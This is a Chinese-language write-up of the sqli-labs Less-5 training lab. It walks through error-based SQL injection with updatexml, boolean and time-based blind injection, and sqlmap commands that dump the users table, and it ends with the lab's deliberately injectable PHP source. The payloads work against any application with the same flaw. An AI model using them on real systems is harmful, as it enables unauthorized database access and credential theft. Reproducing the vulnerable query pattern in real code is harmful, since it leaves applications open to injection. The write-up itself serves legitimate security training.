---
title: sqli-labs Less-5 Writeup
date: 2026-11-02
category: [Web安全]
tags: [Sqli-labs, SQL注入, 报错注入, 盲注, updatexml]
---

## 一、 漏洞概述
*   **靶场名称**：sqli-labs
*   **关卡**：Less-5
*   **漏洞类型**：基于报错的单引号字符型注入 / 盲注
*   **后端 SQL 语句**：`SELECT * FROM users WHERE id='$id' LIMIT 0,1`
*   **本关特点**：页面**没有回显位**。无论查询成功与否，只会显示 "You are in..." 或者无任何信息。这意味着 Less-1 到 Less-4 使用的 `UNION SELECT` 联合查询在这里失效了，我们需要利用**报错注入**、**布尔盲注**或**时间盲注**来获取数据。

## 二、 注入点探测与闭合方式判断

### 1. 正常访问
访问 `?id=1`，页面显示：
```text
You are in...
```

### 2. 单引号试探与闭合

访问 ?id=1'，页面报错：

```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

访问 ?id=1' --+，页面恢复显示 You are in...。
结论：闭合方式为单引号 '。

### 3. 验证无回显 (UNION 失效)

尝试联合查询 ?id=-1' union select 1,2,3 --+，页面依然只显示 You are in... 或者空白，数字 1,2,3 并没有回显到页面上。

## 三、 手工注入实战 (报错注入法)

由于页面没有回显位，但会输出 SQL 报错信息，最直接有效的方法是使用 updatexml() 或 extractvalue() 函数进行报错注入。

### 1. 爆出当前数据库名

利用 updatexml 函数，通过 concat 将查询结果拼接到 XPath 路径中（用 ~ 即 0x7e 包裹），强制触发报错并带出结果：

```http
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
```

· 页面回显报错：XPATH syntax error: '~security~'
· 成功获取数据库名：security。

### 2. 爆出表名

报错注入有长度限制（约32位），通常使用 limit 逐个获取表名。获取第一个表名：

```http
?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1) --+
```

· 回显：XPATH syntax error: '~emails~'
· 修改 limit 1,1、limit 2,1 等，可依次爆出 referers, uagents, users。

### 3. 爆出字段名

获取 users 表的第一个字段名：

```http
?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1) --+
```

· 回显：XPATH syntax error: '~id~'
· 修改 limit 依次获取 username 和 password。

### 4. 爆出账号密码数据

获取第一条用户名：

```http
?id=1' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+
```

· 回显：XPATH syntax error: '~Dumb~'
  获取第一条密码：

```http
?id=1' and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) --+
```

· 回显：XPATH syntax error: '~Dumb~'
  (注：如果字段太长，可以使用 substr() 函数分段截取，例如 substr((select password from users limit 0,1),1,15))

---

## 四、 其他注入方式 (盲注思路)

如果服务器关闭了报错显示（不显示 SQL 错误信息），我们就需要用到盲注。

### 1. 布尔盲注 (Boolean-Based Blind)

利用页面的两种状态（正常显示 "You are in..." 或 空白）来判断条件真假。

· 判断数据库名长度：
  ```http
  ?id=1' and length(database())=8 --+
  ```
  （如果页面显示 "You are in..."，说明长度就是 8）
· 逐字符猜解：
  ```http
  ?id=1' and ascii(substr(database(),1,1))=115 --+
  ```
  （如果页面正常显示，说明第一个字符的 ASCII 码是 115，即 's'）

### 2. 时间盲注 (Time-Based Blind)

如果页面连真假状态都不区分（无论怎样都显示同样内容），可以使用 sleep() 函数。

· 判断注入：
  ```http
  ?id=1' and if(length(database())=8, sleep(3), 1) --+
  ```
  （如果页面卡顿 3 秒后才加载，说明条件成立）

---

## 五、 自动化工具测试 (SQLMap)

对于盲注或报错注入，手工跑非常耗时，建议使用 SQLMap。

### 1. 基础探测：

```bash
sqlmap -u "http://127.0.0.1/sqli-labs/Less-5/?id=1" --batch
```

(SQLMap 会自动识别出本关存在布尔盲注、时间盲注和报错注入)

### 2. 直接获取所有数据：

```bash
sqlmap -u "http://127.0.0.1/sqli-labs/Less-5/?id=1" --batch --dump
```

### 3. 指定报错注入技术跑数据：

```bash
sqlmap -u "http://127.0.0.1/sqli-labs/Less-5/?id=1" --batch --technique=E -D security -T users --dump
```

(--technique=E 指定使用 Error-based 报错注入，速度较快)

---

## 六、 源码分析

查看 Less-5 的 PHP 源码：

```php
$id = $_GET['id'];
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; 
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

if($row){
    echo "<font size='5' color= '#99FF00'>";
    echo 'Your Login name:' . $row['username']; // 源码中其实有回显，但通常是空白
    // ... 
} else {
    echo '<font color= "#FFFF00">';
    print_r(mysql_error()); // 关键点：将 MySQL 报错信息直接输出到了页面
    echo "</font>";  
}
```


